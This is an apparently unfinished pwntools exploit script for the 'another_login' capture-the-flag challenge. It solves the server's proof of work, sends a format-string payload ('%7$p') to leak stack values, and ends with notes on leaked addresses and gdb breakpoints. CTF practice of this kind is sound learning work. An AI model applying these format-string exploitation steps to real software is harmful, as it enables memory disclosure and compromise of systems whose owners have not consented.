#!/usr/bin/env python3

# nc challs.m0lecon.it 1907

from hashlib import sha256
from pwn import *
import sys

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

commands = '''
b signin
c
# i loop
#pie breakpoint *0x1330
# c in rax
#pie breakpoint *0x134e
# e in rax
#pie breakpoint *0x136f
# (long)atoi in rax
#pie breakpoint *0x13b9
# input_long = 0
#pie breakpoint *0x13df
#pie breakpoint *0x13e4
# printf
pie breakpoint *0x1409
c
'''

if len(sys.argv) > 1:
    if sys.argv[1] == 'gdb':
        r = gdb.debug('./another_login', commands)
    elif sys.argv[1] == 'remote':
        r = remote('challs.m0lecon.it', 1907)
        solvepow(r, n = 5)
else:
    r = process('./another_login')

input_long = 0x7fffffffde18
i_loop = 0x7fffffffde14

n = b''
n += b'%7$p'
#n += b'%p' * 9
n += b'\x00' * (0x12 - len(n))

assert len(n) == 0x12

print(r.recv())
r.sendline(n)

r.interactive()

'''
x/10wx 0x7fffffffde14
input_long = 0x7fffffffde18
i = 0x7fffffffde14

(nil) (nil) 0x7ffff7ed2f33 0x10 (nil) 0xf7e65c70 (nil) 0x7fffffffde18 0x9
(nil) (nil) 0x7ffff7ed2f33 0x10 (nil) 0xf7e65c70  0x1  0x7fffffffde18 0xe8
                                                   |                   |
                                               input_long         first rand

(nil)(nil) 0x7ffff7ed2f33 0x10 (nil) 0x10 f7e65c70 0x20 0x7fffffffde18 0xdd
                                      |             |                   |
                                    i loop      input_long         first rand
'''
